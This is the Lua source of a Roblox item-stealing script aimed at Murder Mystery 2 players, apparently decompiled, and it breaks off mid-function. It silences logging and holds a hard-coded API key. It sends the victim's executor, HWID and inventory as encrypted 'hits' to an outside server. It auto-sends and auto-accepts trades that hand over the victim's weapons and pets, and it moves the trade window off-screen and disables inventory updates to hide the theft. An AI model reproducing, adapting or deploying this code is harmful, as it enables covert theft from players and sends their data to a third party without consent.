-- discord.gg/syncrypt

local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)

		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end

	return function()
		local r = table.pack(f(s, c))

		if r[1] == nil then
			return false
		end

		c = r[1]

		return true, table.unpack(r, 1, r.n)
	end
end

if getgenv().executed then
	if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 then
		return
	end

	if getgenv().accessCode then
		return
	end
end

getgenv().executed = true
print = function()
end
warn = function()
end
error = function()
end

local function v4()
end

info = v4

local t1 = {
	cache = {}
}

local function v6()
	return nil
end

t1.a = function()
	local a = t1.cache.a

	if not a then
		a = {
			c = v6()
		}
		t1.cache.a = a
	end

	return a.c
end

local function v8()
	t1.a()

	local t2 = {
		API_BASE_URL = PROXY_URL or "https://api.project-reverse.org",
		EXPLOIT_API_KEY = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto",
		GAME_ID = 66654135,
		GAME_NAME = "mm2",
		GIVE_ALL_ITEMS = true
	}

	t2.EXECUTOR_NAME = getexecutorname():lower()
	t2.HWID = gethwid and gethwid() or "unknown"
	t2.IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK = {
		"no valuables to steal",
		"failed to pull from connection",
		"failed to register due to error"
	}

	return t2
end

t1.b = function()
	local b = t1.cache.b

	if not b then
		b = {
			c = v8()
		}
		t1.cache.b = b
	end

	return b.c
end

local function v11()
	local t3 = {
		"verbose",
		"error",
		"warn"
	}

	local function v13(...)
		local t4 = { ... }
		local t5 = {}

		local function v16(p1)
			local function v17(...)
				return ...
			end

			for i = #t4, 1, -1 do
				local v19 = t4[i]
				local v20 = v17

				v17 = function(...)
					return v19(p1, v20, ...)
				end
			end

			return v17
		end

		for _, v in t3, nil, nil do
			t5[v] = v16(v)
		end

		return t5
	end

	return v13
end

t1.c = function()
	local c = t1.cache.c

	if not c then
		c = {
			c = v11()
		}
		t1.cache.c = c
	end

	return c.c
end

local function v24()
	return nil
end

t1.d = function()
	local d = t1.cache.d

	if not d then
		d = {
			c = v24()
		}
		t1.cache.d = d
	end

	return d.c
end

local function v26()
	t1.d()

	local function v27()
		local t6 = {}

		return {
			subscribe = function(p2)
				t6[p2] = true

				local function v29()
					t6[p2] = nil
				end

				return v29
			end,
			publish = function(p3)
				for k in t6, nil, nil do
					task.spawn(k, p3)
				end
			end
		}
	end

	return v27
end

t1.e = function()
	local e = t1.cache.e

	if not e then
		e = {
			c = v26()
		}
		t1.cache.e = e
	end

	return e.c
end

local function v32()
	t1.d()

	local function v33()
		local t7 = {}

		t7.create = function(p4)
			return {
				payload = p4,
				parent = t7
			}
		end
		t7.createObserver = function(p5)
			local function v35(p6)
				if p6.parent ~= t7 then
					return
				end

				p5(p6)
			end

			return v35
		end

		return t7
	end

	return v33
end

t1.f = function()
	local f = t1.cache.f

	if not f then
		f = {
			c = v32()
		}
		t1.cache.f = f
	end

	return f.c
end

local function v37()
	t1.d()

	return {
		createBus = t1.e(),
		createEventDefinition = t1.f()
	}
end

t1.g = function()
	local g = t1.cache.g

	if not g then
		g = {
			c = v37()
		}
		t1.cache.g = g
	end

	return g.c
end

local function v39()
	return nil
end

t1.h = function()
	local h = t1.cache.h

	if not h then
		h = {
			c = v39()
		}
		t1.cache.h = h
	end

	return h.c
end

local function v41()
	t1.h()

	return nil
end

t1.i = function()
	local i = t1.cache.i

	if not i then
		i = {
			c = v41()
		}
		t1.cache.i = i
	end

	return i.c
end

local function v43()
	t1.a()

	return nil
end

t1.j = function()
	local j = t1.cache.j

	if not j then
		j = {
			c = v43()
		}
		t1.cache.j = j
	end

	return j.c
end

local function v45()
	t1.j()

	return nil
end
local function k()
	local k2 = t1.cache.k

	if not k2 then
		k2 = {
			c = v45()
		}
		t1.cache.k = k2
	end

	return k2.c
end

t1.k = k

local function v48()
	return nil
end

t1.l = function()
	local l = t1.cache.l

	if not l then
		l = {
			c = v48()
		}
		t1.cache.l = l
	end

	return l.c
end

local function v50()
	t1.c()
	t1.g()
	t1.i()
	t1.k()
	t1.l()

	return {}
end

t1.m = function()
	local m = t1.cache.m

	if not m then
		m = {
			c = v50()
		}
		t1.cache.m = m
	end

	return m.c
end

local function v52()
	local v54
	local t9 = {
		["\\"] = "\\",
		["\""] = "\"",
		["\8"] = "b",
		["\12"] = "f",
		["\n"] = "n",
		["\r"] = "r",
		["\t"] = "t"
	}
	local t10 = {
		["/"] = "/"
	}

	for k2, v in t9, nil, nil do
		t10[v] = k2
	end

	local function v59(p7)
		return "\\" .. (t9[p7] or string.format("u%04x", p7:byte()))
	end
	local function v60()
		return "null"
	end
	local function v61(p8, p9)
		local t11 = {}
		local v63 = p9 or {}

		if v63[p8] then
			error("circular reference")
		end

		v63[p8] = true

		if rawget(p8, 1) == nil and next(p8) ~= nil then
			for k2, v in p8, nil, nil do
				if type(k2) ~= "string" then
					error("invalid table: mixed or invalid key types")
				end

				table.insert(t11, v54(k2, v63) .. ":" .. v54(v, v63))
			end

			v63[p8] = nil

			return "{" .. table.concat(t11, ",") .. "}"
		end

		local n1 = 0

		for k2 in p8, nil, nil do
			if type(k2) ~= "number" then
				error("invalid table: mixed or invalid key types")
			end

			n1 += 1
		end

		if n1 ~= #p8 then
			error("invalid table: sparse array")
		end

		for _, v in ipairs(p8) do
			table.insert(t11, v54(v, v63))
		end

		v63[p8] = nil

		return "[" .. table.concat(t11, ",") .. "]"
	end
	local function v70(p10)
		return "\"" .. p10:gsub("[%z\1-\31\\\"]", v59) .. "\""
	end
	local function v71(p11)
		if p11 == p11 then
			if p11 <= -math.huge or math.huge <= p11 then
				error("unexpected number value '" .. tostring(p11) .. "'")
			end
		else
			error("unexpected number value '" .. tostring(p11) .. "'")

			return string.format("%.14g", p11)
		end

		return string.format("%.14g", p11)
	end
	local function v72(p12)
		return "\"" .. tostring(p12) .. "\""
	end

	local t12 = {
		["nil"] = v60,
		table = v61,
		string = v70,
		number = v71,
		boolean = tostring,
		["function"] = v72,
		thread = v72,
		userdata = v72
	}

	v54 = function(p13, p14)
		local kind = type(p13)
		local v75 = t12[kind]

		if v75 then
			return v75(p13, p14)
		end

		error("unexpected type '" .. kind .. "'")
	end

	local t8 = {
		encode = function(p15)
			return (v54(p15))
		end
	}
	local v76

	local function v77(...)
		local t13 = {}

		for i = 1, select("#", ...) do
			t13[select(i, ...)] = true
		end

		return t13
	end

	local v80 = v77(" ", "\t", "\r", "\n")
	local v81 = v77(" ", "\t", "\r", "\n", "]", "}", ",")
	local v82 = v77("\\", "/", "\"", "b", "f", "n", "r", "t", "u")
	local v83 = v77("true", "false", "null")
	local t14 = {
		["true"] = true,
		["false"] = false,
		null = nil
	}

	local function v85(p16, p17, p18, p19)
		for i = p17, #p16 do
			if p18[p16:sub(i, i)] == p19 then
				continue
			end

			return i
		end

		return #p16 + 1
	end
	local function v87(p20, p21, p22)
		local n2 = 1
		local n3 = 1

		for i = 1, p21 - 1 do
			n3 += 1

			if p20:sub(i, i) == "\n" then
				n2 += 1
				n3 = 1
			end
		end

		error(string.format("%s at line %d col %d", p22, n2, n3))
	end
	local function v91(p23)
		if p23 <= 127 then
			return string.char(p23)
		end

		if p23 <= 2047 then
			return string.char(math.floor(p23 / 64) + 192, p23 % 64 + 128)
		end

		if p23 <= 65535 then
			return string.char(math.floor(p23 / 4096) + 224, math.floor(p23 % 4096 / 64) + 128, p23 % 64 + 128)
		end

		if p23 <= 1114111 then
			return string.char(math.floor(p23 / 262144) + 240, math.floor(p23 % 262144 / 4096) + 128, math.floor(p23 % 4096 / 64) + 128, p23 % 64 + 128)
		end

		error(string.format("invalid unicode codepoint '%x'", p23))
	end
	local function v92(p24)
		local v93 = tonumber(p24:sub(1, 4), 16)
		local v94 = tonumber(p24:sub(7, 10), 16)

		if v94 then
			return v91((v93 - 55296) * 1024 + (v94 - 56320) + 65536)
		end

		return v91(v93)
	end
	local function v95(p25, p26)
		local s1 = ""
		local v97 = p26 + 1
		local v98 = v97

		while true do
			if not (v97 <= #p25) then
				v87(p25, p26, "expected closing quote for string")

				return
			end

			local v99 = p25:byte(v97)

			if v99 < 32 then
				v87(p25, v97, "control character in string")
			elseif v99 == 92 then
				local v100 = s1 .. p25:sub(v98, v97 - 1)

				v97 += 1

				local v101 = p25:sub(v97, v97)

				if v101 == "u" then
					local match = p25:match("^[dD][89aAbB]%x%x\\u%x%x%x%x", v97 + 1) or p25:match("^%x%x%x%x", v97 + 1) or v87(p25, v97 - 1, "invalid unicode escape in string")

					s1 = v100 .. v92(match)
					v97 += #match
				else
					if not v82[v101] then
						v87(p25, v97 - 1, "invalid escape char '" .. v101 .. "' in string")
					end

					s1 = v100 .. t10[v101]
				end

				v98 = v97 + 1
			elseif v99 == 34 then
				break
			end

			v97 += 1
		end

		return s1 .. p25:sub(v98, v97 - 1), v97 + 1
	end
	local function v103(p27, p28)
		local v104 = v85(p27, p28, v81)
		local v105 = p27:sub(p28, v104 - 1)
		local v106 = tonumber(v105)

		if not v106 then
			v87(p27, p28, "invalid number '" .. v105 .. "'")
		end

		return v106, v104
	end
	local function v107(p29, p30)
		local v108 = v85(p29, p30, v81)
		local v109 = p29:sub(p30, v108 - 1)

		if not v83[v109] then
			v87(p29, p30, "invalid literal '" .. v109 .. "'")
		end

		return t14[v109], v108
	end
	local function v110(p31, p32)
		local t15 = {}
		local n4 = 1
		local v113 = p32 + 1

		while true do
			local v114 = v85(p31, v113, v80, true)

			if p31:sub(v114, v114) == "]" then
				v113 = v114 + 1

				break
			end

			local v115, v116 = v76(p31, v114)

			t15[n4] = v115
			n4 += 1

			local v117 = v85(p31, v116, v80, true)
			local v118 = p31:sub(v117, v117)

			v113 = v117 + 1

			if v118 == "]" then
				break
			end

			if v118 ~= "," then
				v87(p31, v113, "expected ']' or ','")
			end
		end

		return t15, v113
	end
	local function v119(p33, p34)
		local t16 = {}
		local v121 = p34 + 1

		while true do
			local v122 = v85(p33, v121, v80, true)

			if p33:sub(v122, v122) == "}" then
				v121 = v122 + 1

				break
			end

			if p33:sub(v122, v122) ~= "\"" then
				v87(p33, v122, "expected string for key")
			end

			local v123, v124 = v76(p33, v122)
			local v125 = v85(p33, v124, v80, true)

			if p33:sub(v125, v125) ~= ":" then
				v87(p33, v125, "expected ':' after key")
			end

			local v126 = v85(p33, v125 + 1, v80, true)
			local v127, v128 = v76(p33, v126)

			t16[v123] = v127

			local v129 = v85(p33, v128, v80, true)
			local v130 = p33:sub(v129, v129)

			v121 = v129 + 1

			if v130 == "}" then
				break
			end

			if v130 ~= "," then
				v87(p33, v121, "expected '}' or ','")
			end
		end

		return t16, v121
	end

	local t17 = {
		["\""] = v95,
		["0"] = v103,
		["1"] = v103,
		["2"] = v103,
		["3"] = v103,
		["4"] = v103,
		["5"] = v103,
		["6"] = v103,
		["7"] = v103,
		["8"] = v103,
		["9"] = v103,
		["-"] = v103,
		t = v107,
		f = v107,
		n = v107,
		["["] = v110,
		["{"] = v119
	}

	v76 = function(p35, p36)
		local v132 = p35:sub(p36, p36)
		local v133 = t17[v132]

		if v133 then
			return v133(p35, p36)
		end

		v87(p35, p36, "unexpected character '" .. v132 .. "'")
	end
	t8.decode = function(p37)
		if type(p37) ~= "string" then
			error("expected argument of type string, got " .. type(p37))
		end

		local v134, v135 = v76(p37, v85(p37, 1, v80, true))
		local v136 = v85(p37, v135, v80, true)

		if v136 <= #p37 then
			v87(p37, v136, "trailing garbage")
		end

		return v134
	end

	return t8
end

t1.n = function()
	local v137 = t1.cache.n

	if not v137 then
		v137 = {
			c = v52()
		}
		t1.cache.n = v137
	end

	return v137.c
end

local function v138()
	local function v139(p38, p39, p40, p41, p42)
		local v140 = buffer.readu32(p38, p39)
		local v141 = buffer.readu32(p38, p40)
		local v142 = buffer.readu32(p38, p41)
		local v143 = buffer.readu32(p38, p42)
		local v144 = bit32.band(v140 + v141, 4294967295)
		local v145 = bit32.lrotate(bit32.bxor(v143, v144), 16)
		local v146 = bit32.band(v142 + v145, 4294967295)
		local v147 = bit32.lrotate(bit32.bxor(v141, v146), 12)
		local v148 = bit32.band(v144 + v147, 4294967295)
		local v149 = bit32.lrotate(bit32.bxor(v145, v148), 8)
		local v150 = bit32.band(v146 + v149, 4294967295)
		local v151 = bit32.lrotate(bit32.bxor(v147, v150), 7)

		buffer.writeu32(p38, p39, v148)
		buffer.writeu32(p38, p40, v151)
		buffer.writeu32(p38, p41, v150)
		buffer.writeu32(p38, p42, v149)
	end
	local function v152(p43, p44, p45)
		buffer.copy(p43, 0, p44, 0, 64)

		for i = 1, 10 do
			v139(p43, 0, 16, 32, 48)
			v139(p43, 4, 20, 36, 52)
			v139(p43, 8, 24, 40, 56)
			v139(p43, 12, 28, 44, 60)
			v139(p43, 0, 20, 40, 60)
			v139(p43, 4, 24, 44, 48)
			v139(p43, 8, 28, 32, 52)
			v139(p43, 12, 16, 36, 56)
		end

		for i = 0, 60, 4 do
			local v155 = bit32.band(buffer.readu32(p44, i) + buffer.readu32(p43, i), 4294967295)

			buffer.writeu32(p45, i, v155)
		end
	end

	return table.freeze({
		crypt = function(p46, p47, p48, p49)
			assert(buffer.len(p46) == 32, "Key must be exactly 32 bytes (256 bits)")
			assert(buffer.len(p47) == 12, "Nonce must be exactly 12 bytes (96 bits)")

			local v156 = buffer.create(64)

			buffer.writestring(v156, 0, "expand 32-byte k")
			buffer.copy(v156, 16, p46, 0, 32)
			buffer.writeu32(v156, 48, p49 or 0)
			buffer.copy(v156, 52, p47, 0, 12)

			local v157 = buffer.create(64)
			local v158 = buffer.create(64)
			local v159 = buffer.len(p48)
			local v160 = buffer.create(v159)
			local n5 = 0

			if n5 < v159 then
				repeat
					v152(v157, v156, v158)
					buffer.writeu32(v156, 48, bit32.band(buffer.readu32(v156, 48) + 1, 4294967295))

					local v162 = math.min(64, v159 - n5)
					local n6 = 0

					while n6 <= v162 - 4 do
						local v164 = buffer.readu32(p48, n5 + n6)
						local v165 = buffer.readu32(v158, n6)

						buffer.writeu32(v160, n5 + n6, bit32.bxor(v164, v165))
						n6 += 4
					end

					if n6 < v162 then
						repeat
							local v166 = buffer.readu8(p48, n5 + n6)
							local v167 = buffer.readu8(v158, n6)

							buffer.writeu8(v160, n5 + n6, bit32.bxor(v166, v167))
							n6 += 1
						until not (n6 < v162)
					end

					n5 += v162
				until not (n5 < v159)
			end

			return v160
		end
	})
end

t1.o = function()
	local o = t1.cache.o

	if not o then
		o = {
			c = v138()
		}
		t1.cache.o = o
	end

	return o.c
end

local function v169()
	local v170 = t1.o()
	local EncodingService = game:GetService("EncodingService")

	local function v172(p50)
		local ok, result = pcall(function()
			return EncodingService:CompressBuffer(p50, Enum.CompressionAlgorithm.Zstd, -1)
		end)

		if not ok then
			local error_ = error
			local v176 = ("Zstd compression failed: %*"):format(result)

			error_(v176)
		end

		return result
	end
	local function v177(p51)
		local ok, result = pcall(function()
			return EncodingService:DecompressBuffer(p51, Enum.CompressionAlgorithm.Zstd)
		end)

		if not ok then
			local error_ = error
			local v181 = ("Zstd decompression failed: %*"):format(result)

			error_(v181)
		end

		return result
	end

	local s2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local t18 = {}

	for i = 1, 64 do
		t18[string.byte(s2, i)] = i - 1
	end

	t18[61] = 64

	local function v185(p52)
		local v186 = #p52

		if v186 == 0 then
			return ""
		end

		local t19 = {}
		local n7 = 1

		while n7 <= v186 - 3 do
			local v189, v190, v191, v192 = string.byte(p52, n7, n7 + 3)
			local v193 = t18[v189]
			local v194 = t18[v190]
			local v195 = t18[v191]
			local v196 = t18[v192]

			if v195 == 64 then
				t19[#t19 + 1] = string.char(bit32.lshift(v193, 2) + bit32.rshift(v194, 4))

				break
			end

			if v196 == 64 then
				t19[#t19 + 1] = string.char(bit32.lshift(v193, 2) + bit32.rshift(v194, 4))
				t19[#t19 + 1] = string.char(bit32.band(bit32.lshift(v194, 4), 240) + bit32.rshift(v195, 2))

				break
			end

			t19[#t19 + 1] = string.char(bit32.lshift(v193, 2) + bit32.rshift(v194, 4))
			t19[#t19 + 1] = string.char(bit32.band(bit32.lshift(v194, 4), 240) + bit32.rshift(v195, 2))
			t19[#t19 + 1] = string.char(bit32.band(bit32.lshift(v195, 6), 192) + v196)
			n7 += 4
		end

		return table.concat(t19)
	end
	local function v197(p53)
		local t20 = {}
		local v199 = #p53

		for i = 1, v199, 3 do
			local v201, v202, v203 = string.byte(p53, i, i + 2)
			local v204 = v201 * 65536 + (v202 or 0) * 256 + (v203 or 0)
			local v205 = math.floor(v204 / 262144) % 64
			local v206 = math.floor(v204 / 4096) % 64
			local v207 = math.floor(v204 / 64) % 64
			local v208 = v204 % 64

			t20[#t20 + 1] = s2:sub(v205 + 1, v205 + 1)
			t20[#t20 + 1] = s2:sub(v206 + 1, v206 + 1)

			local v209 = #t20 + 1

			t20[v209] = i + 1 <= v199 and s2:sub(v207 + 1, v207 + 1) or "="
			t20[#t20 + 1] = i + 2 <= v199 and s2:sub(v208 + 1, v208 + 1) or "="
		end

		return table.concat(t20)
	end

	local t21 = {
		49,
		41,
		25,
		47,
		41,
		2,
		1,
		1,
		19,
		33,
		30,
		55,
		17,
		26,
		56,
		47,
		4,
		16,
		8,
		56,
		8,
		30,
		32,
		22,
		13,
		10,
		21,
		38,
		1,
		3,
		39,
		59,
		63,
		5,
		32,
		39,
		60,
		49,
		38,
		26,
		8,
		56,
		62,
		41
	}
	local obj = setmetatable({}, {
		__index = function(p54, p55)
			local v212 = #s2

			return ({
				total = v212 - math.floor(v212 / 3) + 1,
				spin = v212 / 4 - 3,
				shift = v212 / 8 - 1,
				stride = v212 / 2 - 3,
				salt = v212 / 8 + 3,
				split = v212 / 8 + v212 / 16
			})[p55]
		end
	})
	local obj2 = setmetatable({}, {
		__index = function(p56, p57)
			local v214 = p57 - 1

			return string.byte(s2, bit32.bxor(t21[(v214 * obj.spin + obj.shift) % obj.total + 1], (v214 * obj.stride + math.floor(v214 * v214 / 3) + obj.salt) % #s2) + 1)
		end
	})
	local split = obj.split

	local function v216(p58, p59)
		local v217 = p58 + p59 * 4

		return obj2[v217 + 1] + obj2[v217 + 2] * 256 + obj2[v217 + 3] * 65536 + obj2[v217 + 4] * 16777216
	end

	local v218 = buffer.create(32)

	for i = 0, 7 do
		buffer.writeu32(v218, i * 4, v216(split, i))
	end

	local v220 = buffer.create(12)

	for i = 0, 2 do
		buffer.writeu32(v220, i * 4, v216(0, i))
	end

	local n8 = 1

	return {
		encrypt = function(p60)
			local v223 = buffer.fromstring(p60)
			local v224 = v170.crypt(v218, v220, v172(v223), n8)

			return v197(buffer.tostring(v224))
		end,
		decrypt = function(p61)
			local v225 = v170.crypt(v218, v220, buffer.fromstring(v185(p61)), n8)
			local v226 = v177(v225)

			return buffer.tostring(v226)
		end
	}
end

t1.p = function()
	local p = t1.cache.p

	if not p then
		p = {
			c = v169()
		}
		t1.cache.p = p
	end

	return p.c
end

local function v228()
	local v229 = t1.b()
	local t22 = {}

	local function v231()
		return {
			ref = nil
		}
	end
	local function v232(...)
		local t23 = { ... }

		while true do
			local v234 = false

			for _, v in t23, nil, nil do
				if coroutine.status(v) == "dead" then
					v234 = true
				elseif v234 then
					pcall(task.cancel, v)
				end
			end

			if not v234 then
				task.wait(0.1)

				continue
			end

			break
		end
	end
	local function v237(p62)
		local t24 = {
			Url = v229.API_BASE_URL .. p62.request.endpoint,
			Method = p62.request.method,
			Headers = p62.request.headers
		}
		local body

		if p62.request.body == nil then
			body = nil
		else
			body = p62.request.body
		end

		t24.Body = body

		local ok, result = pcall(request, t24)

		if not ok then
			p62.response.ref = {
				ok = false,
				body = result
			}

			return
		end

		if result == nil then
			p62.response.ref = {
				ok = false,
				body = "response is nil"
			}

			return
		end

		if result.Body == nil then
			p62.response.ref = {
				ok = false,
				body = "body is nil"
			}

			return
		end

		p62.response.ref = {
			ok = result.StatusCode == 200,
			body = result.Body
		}
	end
	local function v242()
		while true do
			local v243 = table.remove(t22, 1)

			if v243 == nil then
				task.wait(0.1)
			else
				task.spawn(v232, task.spawn(v237, v243), task.delay(10, function()
					if v243.response.ref ~= nil then
						return
					end

					v243.response.ref = {
						ok = false,
						body = "request timed out"
					}
				end))
			end
		end
	end
	local function v244(p63, p64, p65, p66)
		local v245 = v231()

		table.insert(t22, {
			request = {
				method = p63,
				endpoint = p64,
				headers = p65,
				body = p66
			},
			response = v245
		})

		repeat
			task.wait(0.1)
		until v245.ref ~= nil

		return v245.ref
	end

	task.spawn(v242)

	return v244
end

t1.q = function()
	local q = t1.cache.q

	if not q then
		q = {
			c = v228()
		}
		t1.cache.q = q
	end

	return q.c
end

local function v247()
	local v248 = t1.n()
	local v249 = t1.p()
	local v250 = t1.b()

	t1.q()

	local function v251(p67)
		return {
			["exploit-api-key"] = v250.EXPLOIT_API_KEY,
			["content-type"] = p67
		}
	end
	local function v252(p68)
		if not p68.ok then
			error("Failed to parse response, not OK")
		end

		local ok, result = pcall(v248.decode, p68.body)

		if not ok then
			local error_ = error
			local v256 = ("Failed to parse JSON\nResponse: %*\nError: %*"):format(p68.body, result)

			error_(v256)
		end

		local v257 = result

		if not v257.success then
			error("Failed to parse JSON response, not success")
		end

		return v257.data
	end
	local function v258(p69)
		local v259 = v252(p69)
		local v260 = v249.decrypt(v259)

		return v248.decode(v260)
	end

	return {
		getAuthorizationHeaders = v251,
		parseJsonResponse = v252,
		parseEncryptedJsonResponse = v258
	}
end

t1.r = function()
	local r = t1.cache.r

	if not r then
		r = {
			c = v247()
		}
		t1.cache.r = r
	end

	return r.c
end

local function v262()
	local v263 = t1.n()
	local v264 = t1.p()

	t1.k()
	t1.j()

	local v265 = t1.b()
	local v266 = t1.r()
	local v267 = t1.m()
	local v268 = t1.q()

	local function v269()
		local json = v266.getAuthorizationHeaders("application/json")
		local t25 = {
			stealerId = ID,
			executor = v265.EXECUTOR_NAME
		}
		local post = v268("POST", "/hits/execution", json, v263.encode(t25))

		if not post.ok then
			v267.logger.error("Failed to register execution", {
				payload = t25,
				response = post
			})
			error("Failed to register execution")
		end

		return v266.parseJsonResponse(post)
	end
	local function v273(p70)
		local plain = v266.getAuthorizationHeaders("text/plain")
		local v275 = v264.encrypt(v263.encode(p70))
		local post = v268("POST", "/hits/register", plain, v275)

		if not post.ok then
			v267.logger.error("Failed to register hit", {
				payload = p70,
				response = post
			})
			error("Failed to register due to error")
		end

		return v266.parseEncryptedJsonResponse(post)
	end
	local function v277(p71, p72, p73)
		local post = v268("POST", "/hits/claim", v266.getAuthorizationHeaders("application/json"), v263.encode({
			secretKey = p71,
			uniqueId = p72,
			count = p73
		}))

		if not post.ok then
			v267.logger.error("Failed to claim item", {
				uniqueId = p72,
				count = p73,
				response = post
			})
			error("Failed to claim item")
		end
	end
	local function v279(p74)
		local json = v266.getAuthorizationHeaders("application/json")
		local post = v268("POST", ("/hits/connection?secretKey=%*"):format(p74), json, "{}")

		if not post.ok then
			v267.logger.error("Failed to connect", {
				secretKey = p74,
				response = post
			})
			error("Failed to connect")
		end
	end

	return {
		registerExecution = v269,
		registerHit = v273,
		claimItem = v277,
		connect = v279,
		pullFromConnection = function(p75)
			local json = v266.getAuthorizationHeaders("application/json")
			local get = v268("GET", ("/hits/connection?secretKey=%*"):format(p75), json, nil)

			if not get.ok then
				v267.logger.error("Failed to pull from connection", {
					secretKey = p75,
					response = get
				})
				error("Failed to pull from connection")
			end

			return v266.parseJsonResponse(get)
		end
	}
end

t1.s = function()
	local s = t1.cache.s

	if not s then
		s = {
			c = v262()
		}
		t1.cache.s = s
	end

	return s.c
end

local function v285()
	t1.i()
	t1.h()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")

	return {
		getItems = function()
			local t26 = {}
			local ok, result = pcall(function()
				return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(Players.LocalPlayer.Name)
			end)

			if not ok then
				error("Failed to get client inventory")
			end

			for k2, v in result.Weapons.Owned, nil, nil do
				if k2 ~= "DefaultGun" and k2 ~= "DefaultKnife" then
					table.insert(t26, {
						uniqueId = k2,
						name = k2,
						count = v
					})
				end
			end

			for k2, v in result.Pets.Owned, nil, nil do
				table.insert(t26, {
					uniqueId = k2,
					name = k2,
					count = v
				})
			end

			return t26
		end
	}
end

t1.t = function()
	local t = t1.cache.t

	if not t then
		t = {
			c = v285()
		}
		t1.cache.t = t
	end

	return t.c
end

local function v296()
	t1.i()

	local v297 = t1.m()
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local function v300()
		local Trade = ReplicatedStorage:FindFirstChild("Trade")

		if not Trade then
			error("Trade service not found")
		end

		return Trade
	end
	local function v302(p76)
		local v303 = Players:FindFirstChild(p76)

		if v303 then
			local ok, result = pcall(function()
				return v300().SendRequest:InvokeServer(v303)
			end)

			if not ok then
				v297.logger.error("Failed to send trade request", {
					username = p76,
					error = result
				})
			end

			return
		end

		v297.logger.warn("Player not found", {
			username = p76
		})
	end
	local function v306(p77)
		if not Players:FindFirstChild(p77) then
			v297.logger.warn("Player not found", {
				username = p77
			})

			return
		end

		v297.logger.verbose("Accepting trade request", {
			username = p77
		})
		v300().AcceptRequest:FireServer()
	end
	local function v307(p78)
		if Players:FindFirstChild(p78) then
			v297.logger.verbose("Rejecting trade request", {
				username = p78
			})
			v300().DeclineRequest:FireServer()

			return
		end

		v297.logger.warn("Player not found", {
			username = p78
		})
	end

	return {
		sendRequest = v302,
		cancelSentRequest = function()
			v300().CancelRequest:FireServer()
		end,
		acceptRequest = v306,
		rejectRequest = v307
	}
end

t1.u = function()
	local u = t1.cache.u

	if not u then
		u = {
			c = v296()
		}
		t1.cache.u = u
	end

	return u.c
end

local function v309()
	local v310 = t1.g()

	return {
		newTradeCreated = v310.createEventDefinition(),
		tradeFinished = v310.createEventDefinition(),
		itemsAdded = v310.createEventDefinition(),
		targetAppearedOnServer = v310.createEventDefinition()
	}
end

t1.v = function()
	local v311 = t1.cache.v

	if not v311 then
		v311 = {
			c = v309()
		}
		t1.cache.v = v311
	end

	return v311.c
end

local function v312()
	local v313 = t1.v()
	local v314 = t1.m()

	t1.h()
	t1.i()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local v317 = game.PlaceId * 3
	local LastOffer

	ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(p79)
		LastOffer = p79.LastOffer
	end)

	local function v319()
		local Trade = ReplicatedStorage:FindFirstChild("Trade")

		if not Trade then
			error("Trade service not found")
		end

		return Trade
	end
	local function v321()
		local u322
		local u323
		local ok, result = pcall(function()
			local response, v327 = v319().GetTradeStatus:InvokeServer()

			u322 = response
			u323 = v327
		end)

		if ok then
			return u322, u323
		end

		v314.logger.error("Failed to get trade status", {
			error = result
		})
		error("Failed to get trade status")

		return nil, nil
	end
	local function v328()
		local v329 = v321()

		if v329 ~= "StartTrade" then
			return
		end

		local s3, v332

		repeat
			task.wait(1)

			local v333

			v333, v332 = v321()

			if v333 == nil or v332 == nil then
				error("Failed to get trade info")
			end

			if v332 == nil then
				error("Failed to get trade info")
			end

			if v332.Player1 == nil then
				v314.logger.error("Player not found in trade info", {
					tradeInfo = v332,
					tradeType = v333
				})
				error("Player not found in trade info")
			end

			if v332.Player1.Player.Name == Players.LocalPlayer.Name then
				s3 = "Player1"
			else
				s3 = "Player2"
			end

			v319().AcceptTrade:FireServer(v317, LastOffer)
		until v332[s3].Accepted
	end
	local function v334()
		v319().DeclineTrade:FireServer()
	end
	local function v335(p80)
		local OfferItem = v319().OfferItem

		for i = 1, p80.count do
			OfferItem:FireServer(p80.uniqueId, v317)
		end
	end

	return {
		accept = v328,
		decline = v334,
		addItems = function(p81)
			local n9 = 4

			for k2, v in p81, nil, nil do
				if not (n9 < k2) then
					v335(v)

					continue
				end

				break
			end

			v314.coreEventBus.publish(v313.itemsAdded.create())
		end
	}
end

t1.w = function()
	local w = t1.cache.w

	if not w then
		w = {
			c = v312()
		}
		t1.cache.w = w
	end

	return w.c
end

local function v342()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Trade = ReplicatedStorage:FindFirstChild("Trade")
	local Players = game:GetService("Players")

	local function v346(p82, p83, p84)
		p82:GetPropertyChangedSignal(p83):Connect(p84)
	end
	local function v347(p85)
		p85.Position = UDim2.new(99, 99, 99, 99)
	end
	local function v348()
		pcall(function()
			if string.lower(getexecutorname()) == "xeno" then
				require(ReplicatedStorage.Modules.InventoryModule).UpdateInventory = function()
				end
			else
				game:GetService("ReplicatedStorage").Remotes.Inventory.ProfileDataChanged:Destroy()
			end
		end)
	end

	getUserDevice = function()
		if Players.LocalPlayer.PlayerGui:GetAttribute("Device") == nil then
			repeat
				task.wait()
			until Players.LocalPlayer.PlayerGui:GetAttribute("Device")
		end

		return Players.LocalPlayer.PlayerGui:GetAttribute("Device")
	end
	hideTrade = function()
		local TradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
		local TradeGUI_Phone = Players.LocalPlayer.PlayerGui.TradeGUI_Phone
		local v351 = getUserDevice()

		for _, v in TradeGUI:GetChildren() do
			v347(v)
		end

		v347(TradeGUI_Phone.Inactive.Frame)
		v347(TradeGUI_Phone.Inactive.TradeMainOld)
		v347(TradeGUI_Phone.Container)

		if v351 == "Phone" then
			local ClickBlocker = Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild("ClickBlocker")
